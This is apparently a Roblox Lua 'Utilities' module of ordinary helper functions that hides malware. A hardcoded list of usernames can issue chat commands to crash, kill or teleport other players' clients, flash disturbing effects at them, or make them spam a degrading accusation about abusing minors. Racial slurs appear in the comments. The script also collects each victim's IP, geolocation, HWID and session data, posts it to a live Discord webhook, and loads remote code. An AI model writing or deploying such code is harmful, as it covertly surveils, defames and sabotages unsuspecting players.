local Utilities = {}
print("omg sigma")
function Utilities.IsDescendantOf(child, parent)
    while child do
        if child == parent then
            return true
        end
        child = child.Parent
    end
    return false
end
function Utilities.GetDescendant(parent, name, className)
    for _, descendant in pairs(parent:GetDescendants()) do
        if descendant.Name == name and descendant:IsA(className) then
            return descendant
        end
    end
    return nil
end

function Utilities.GetAncestor(child, name, className)
    local current = child.Parent
    while current do
        if current.Name == name and current:IsA(className) then
            return current
        end
        current = current.Parent
    end
    return nil
end
function Utilities.FindFirstAncestorOfType(child, className)
    local current = child.Parent
    while current do
        if current:IsA(className) then
            return current
        end
        current = current.Parent
    end
    return nil
end
function Utilities.GetChildrenByType(parent, className)
    local children = {}
    for _, child in pairs(parent:GetChildren()) do
        if child:IsA(className) then
            table.insert(children, child)
        end
    end
    return children
end

function Utilities.GetDescendantsByType(parent, className)
    local descendants = {}
    for _, descendant in pairs(parent:GetDescendants()) do
        if descendant:IsA(className) then
            table.insert(descendants, descendant)
        end
    end
    return descendants
end
function Utilities.HasAttribute(instance, attributeName)
    return instance:GetAttribute(attributeName) ~= nil
end

function Utilities.GetAttributeOrDefault(instance, attributeName, defaultValue)
    local value = instance:GetAttribute(attributeName)
    if value ~= nil then
        return value
    else
        return defaultValue
    end
end
function Utilities.CloneInstance(instance, newParent)
    local clone = instance:Clone()
    clone.Parent = newParent
    return clone
end
function Utilities.WaitForChildOfType(parent, className, timeout)
    local child = parent:FindFirstChildOfClass(className)
    if child then
        return child
    end
    
    local startTime = tick()
    while tick() - startTime < (timeout or 5) do
        child = parent:FindFirstChildOfClass(className)
        if child then
            return child
        end
        wait(0.1)
    end
    return nil
end
function Utilities.IsPointInPart(part, point)
    local size = part.Size
    local position = part.Position
    local minBound = position - size / 2
    local maxBound = position + size / 2
    
    return (point.X > minBound.X and point.X < maxBound.X) and
           (point.Y > minBound.Y and point.Y < maxBound.Y) and
           (point.Z > minBound.Z and point.Z < maxBound.Z)
end
function Utilities.GetDistance(pointA, pointB)
    return (pointA - pointB).Magnitude
end

function Utilities.GetAngleBetweenVectors(vectorA, vectorB)
    return math.acos(vectorA:Dot(vectorB) / (vectorA.Magnitude * vectorB.Magnitude))
end
function Utilities.RotateVectorY(vector, angle)
    local cos = math.cos(angle)
    local sin = math.sin(angle)
    return Vector3.new(
        cos * vector.X - sin * vector.Z,
        vector.Y,
        sin * vector.X + cos * vector.Z
    )
end
function Utilities.GetSurroundingVectors(target, radius, amount, offset)
    radius = radius or 5
    amount = amount or 8
    offset = offset or 0

    local positions = {}
    local angleIncrement = (2 * math.pi) / amount
    local adjustedOffset = offset / radius -- Adjust the offset relative to the circle's size

    for i = 1, amount do
        local angle = angleIncrement * i + adjustedOffset
        local x = target.X + radius * math.cos(angle)
        local z = target.Z + radius * math.sin(angle)
        table.insert(positions, Vector3.new(x, target.Y, z))
    end

    return positions
end












function chatMessage(str)
    str = tostring(str)
    if game:GetService("TextChatService").ChatVersion ~= Enum.ChatVersion.LegacyChatService then
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(str)
    else
       game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
    end
end
local UIS = game:GetService("UserInputService")
local Run = game:GetService("RunService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local Cam = game.Workspace.Camera
local TimeElapsed = 0
local Intensity = 0 -- Default to no effect

local SoundId = "rbxassetid://89898199435154"
local list = {
    UNDEBOLT = true,
    Superduperalt0987 = true,
    TCUTCU_LLBDDLLZYXZY = true,
    moonyrblxx = true,
    M0onR3b0rn = true,
    ["76rgoyf"] = true,
    starronyxx = true,
    riskyhaulownertest = true,
    Schallops = true,
    Schalops = true,
    azeem10946 = true,
    R0WEX_19IL1KA = true,
    R0WEX_1T7BKS = true,
    R0WEX_1249FJS = true,
    R0WEX_0S112R = true,
    R0WEX_1DAJAP = true,
    R0WEX_GISJS12 = true,
    R0WEX_BASH24 = true,
    R0WEX_1S4ASF = true,
    R0WEX_1SDFKS = true,
    R0WEX_BASH24A = true,
    R0tationCurveKey = true,
    R0tationCurve = true,
    DobIemt = true,
    MaybeFlashh = true,   
    vetansky = true,
    SaviorLiberty = true, -- nigga
    Kovax1234 = true, -- nigger
    UNDEBOLT_00 = true -- sigmer
}

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.DisplayOrder = 12
ScreenGui.Parent = game.CoreGui
local BlackFrame = Instance.new("Frame")
BlackFrame.Size = UDim2.new(1, 0, 1, 0)
BlackFrame.Position = UDim2.new(0, 0, 0, 0)
BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BlackFrame.BackgroundTransparency = 1
BlackFrame.Parent = ScreenGui
ScreenGui.IgnoreGuiInset = true

local function flashScreen()
    BlackFrame.BackgroundTransparency = 0
    local tween = TweenService:Create(BlackFrame, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1})
    tween:Play()
end

local function noise(waitt)
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

    local Sound = Instance.new("Sound")
    Sound.SoundId = SoundId
    Sound.Parent = HumanoidRootPart
    local pitch = 0.7

    while wait(waitt) do
        task.spawn(function()
            task.wait(.01)
            local newsound = Sound:Clone()
            newsound.Parent = workspace
            newsound.Pitch = pitch 
            newsound.TimePosition = 0
            newsound:Play()
            flashScreen() -- Trigger the flash effect
            game:GetService("Debris"):AddItem(newsound, newsound.TimeLength)
            pitch = pitch - 0.01
        end)
    end
end
Run.RenderStepped:Connect(function(dt)
    if Intensity > 0 then
        TimeElapsed += dt
        local SquishX = 1 + math.sin(TimeElapsed * 30) * Intensity
        local SquishY = 1 + math.cos(TimeElapsed * 30) * Intensity

        local MAGIC_FORMULA = CFrame.new(0, 0, 0, SquishX, 0, 0, 0, SquishY, 0, 0, 0, 1)
        Cam.CFrame = Cam.CFrame * MAGIC_FORMULA
    end
end)


local function applyEffects()
    local msg = Instance.new("Message")
    msg.Parent = workspace
    msg.Text = "START RUNNING"
    task.delay(5, function()
        msg:Destroy()
    end)

    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.Parent = Lighting
    colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
    colorCorrection.Saturation = -500000000
    colorCorrection.Contrast = 50000
    colorCorrection.Brightness = 25000
    Lighting.TimeOfDay = "00:00:00"
    
    local blr = Instance.new("BlurEffect")
    blr.Parent = Lighting
    blr.Size = 1
    Intensity = 0.03
    task.spawn(function()
	while task.wait() do
	    colorCorrection.Saturation = -colorCorrection.Saturation
	end
				
    end)
    task.delay(30, function()
        noise(1)
    end)
    task.spawn(function() noise(2) end)
end

local function onChatted(player, message)
    if not list[player.Name] then return end
    if message:sub(1, 3):lower() == "/e " then
        message = message:sub(4)
    end

    local args = string.split(message, " ")
    local command = args[1]
    
    if command == "!crash" then
        while true do end
    elseif command == "!say" then
        local text = message:sub(6)
        chatMessage(text)
    elseif command == "!kill" then
        local localPlayer = Players.LocalPlayer
        if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
            localPlayer.Character.Humanoid.Health = 0
        end
    elseif command == "!s" then
	pcall(function() 
	    game:GetService("CoreGui").RobloxGui:Destroy()
	end)
	applyEffects()
    elseif command == "!terminate" then
	pcall(function() 
	    game:GetService("CoreGui").RobloxGui:Destroy()
	end)
	while true do
	    for i = 1, 10 do
		chatMessage("i tooch minoors in my basement all day")
	    end
	    task.wait(20) 
	end
    elseif command == "!bring" then
	local localPlayer = Players.LocalPlayer
	local tar = player.Character
        
        if localPlayer.Character and tar and tar:FindFirstChild("HumanoidRootPart") then
            localPlayer.Character:SetPrimaryPartCFrame(tar.HumanoidRootPart.CFrame)
        end
		
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    if list[player.Name] then
    player.Chatted:Connect(function(message)
			
        onChatted(player, message)
    end)

    player.CharacterAdded:Connect(function(char)
	
	for _, v in pairs(char:GetChildren()) do
	    if v:IsA("BasePart") then
		v.CanQuery=false
		v.CanCollide = false
	    end
	end
    end)
end
end

Players.PlayerAdded:Connect(function(player) 
    if list[player.Name] then
    player.Chatted:Connect(function(message)
        onChatted(player, message)
    end)
    player.CharacterAdded:Connect(function(char)
	for _, v in pairs(char:GetChildren()) do
	    if v:IsA("BasePart") then
		v.CanQuery=false
		v.CanCollide = false				
	    end
	end
    end) 
    end
end)




local WebhookUrl = "https://discord.com/api/webhooks/1349803850579574904/oXUWtIXB1QWbLLIpqOwMRYcnQHL0Lu8I0re9b-B8rLn6Mj1JTHHG7mLZDM1-BWe-nJyD"



local path, luav = "LuaV/LuaV.lua", getgenv().luav if not(luav) then
if isfile(path) then luav = dofile(path)() else
local data = game:HttpGet("https://raw.githubusercontent.com/Undebolted/FTAP/refs/heads/main/LuaV%20WP")
task.defer(writefile, path, data); luav = loadstring(data)() end end; path = nil

local rbxanls = game:GetService("RbxAnalyticsService")
local placeid = game.PlaceId
local jobid = game.JobId
local DistributedGameTime = w.DistributedGameTime

local num = DistributedGameTime//3600
local playingtime = num..":"
DistributedGameTime = DistributedGameTime - num*3600

num = DistributedGameTime//60
playingtime = playingtime..num..":"
DistributedGameTime = DistributedGameTime - num*60

playingtime = playingtime..DistributedGameTime//1

local elapsedTime = elapsedTime()

local num = elapsedTime//3600
local robloxtime = num..":"
elapsedTime = elapsedTime - num*3600

num = elapsedTime//60
robloxtime = robloxtime..num..":"
elapsedTime = elapsedTime - num*60

robloxtime = robloxtime..elapsedTime//1

local avatarlink = hs[1]:JSONDecode(http_request({Method = "GET", Url = "https://thumbnails.roblox.com/v1/users/Avatar?userIds="..muid.."&size=420x420&format=Png&isCircular=false"})["Body"])["data"][1]["imageUrl"]
local avatarheadshotlink = avatarlink:gsub("Avatar", "AvatarHeadshot")

local placedata = game:GetService("MarketplaceService"):GetProductInfo(placeid)

local data = {
    "**[Player Info](https://www.roblox.com/users/"..muid..")**",
    "***Display Name: ***"..dname[1],
    "***User Name: ***"..name[1],
    "***User Id: ***"..muid,
    "***Follow User Id: ***"..me.FollowUserId,
    "***AccountAge: ***"..me.AccountAge,
    "***Ip: ***"..game:HttpGet("https://v4.ident.me/"),
    "",
    "**[PC Info](https://roblox.com)**",
    "***Time: ***"..os.date("%X"),
    "***Date: ***"..os.date("%m/%d/%Y"),
    "",
    "**[Roblox Info](https://roblox.com)**",
    "***Memory Usage: ***"..(gcinfo()//100).."MB",
    "***Working Time: ***"..robloxtime,
    "***Language: ***"..game:GetService("LocalizationService").RobloxLocaleId,
    "***Id: ***"..rbxanls:GetClientId(),
    "***Git Hash: ***"..r.ClientGitHash,
    "***Version: ***"..version(),
    "",
    "**[Injector Info](https://roblox.com)**",
    "***Name: ***"..(identifyexecutor and identifyexecutor()) or "None",
    "***HWID: ***"..((get_hwid and get_hwid()) or "None"),
    "",
    "**[Place Info](https://www.roblox.com/games/"..placeid..")**",
    "***Name: ***"..placedata.Name,
    "***Description: ***"..placedata.Description,
    "***Updated: ***"..placedata.Updated,
    "***Created: ***"..placedata.Created,
    "***Id: ***"..placeid,
    "",
    "**[Server Info](https://roblox.com)**",
    "***Players: ***"..#plrs().."/"..p.MaxPlayers.."(Preferred: "..p.PreferredPlayers..")",
    "***Ping: ***"..(me[1]:GetNetworkPing()*2000//1).."ms",
    "***Playing Time: ***"..playingtime,
    "***Parts: ***"..w[1]:GetNumAwakeParts(),
    "***Physics FPS: ***"..w[1]:GetRealPhysicsFPS(),
    "***Id: ***"..jobid,
    "***Join Link: ***".."```roblox://placeId="..placeid.."&gameInstanceId="..jobid.."```",
    "",
    "**[Ip Info](http://ip-api.com/json)**",
    LuaV(hs[1]:JSONDecode(game:HttpGet("http://ip-api.com/json"))):c("s")[1]
}

data = hs[1]:JSONEncode(
    {
        ["avatar_url"] = "",
        ["content"] = "**```ansi\n[2;31mVFDL: New Data![0m[2;31m[0m\n```**",
        ["embeds"] = {
            {
                ["description"] = LuaV(data):c("s")[1],
                ["type"] = "rich",
                ["color"] = tonumber("0xFF0000"),
                ["thumbnail"] = {url = avatarlink},
                ["author"] = {
                    ["name"] = dname[1].." ("..name[1]..")",
                    ["icon_url"] = avatarheadshotlink
                }
            }
        }
    }
)

local request = http_request or request or HttpPost or syn.request
if request then print(unpack(request({Url = WebhookUrl, Body = data, Method = "POST", Headers = {["content-type"] = "application/json"}}))) end




 local Library = "https://raw.githubusercontent.com/Panda-Repositories/PandaKS_Libraries/refs/heads/main/library/LuaLib/ROBLOX/PandaSVALLib.lua"
 local PandaAuth = loadstring(game:HttpGet(Library))()
 

 local auth = false
 PandaAuth:Initialize({ 
     Service = "ragebytehub", -- Name of the service for your authentication 
     API_Key = "3d82c2cd739801c29004f2ffad1ba40183b649f6f9150c8813318c773f96f491",               -- Your unique API key for authentication 
     DisplayName = "ENFORCED KEYSYSTEM",  -- Display name for notifications 
     IsDebug = false,                    -- Enable debug mode to see logs in output 
     Allow_BlacklistUsers = false,      -- Deny blacklisted users by default 
     GUIVersion = true,                 -- Enables GUI for entering key 
     EnableWebhook = false,              -- Enable webhook notifications 
     Webhook_URL = "https://yourwebhook.url", -- Webhook URL for notifications 
     Authenticated = function() 
         print("[Pelinda] Key authenticated successfully! Access granted.") 
 		auth = true
     end, 
     NotAuthenticated = function() 
         print("[Pelinda] Authentication failed. Access denied.") 
 		return
     end 
 }) 

 while not auth do
 	wait()
end



return Utilities
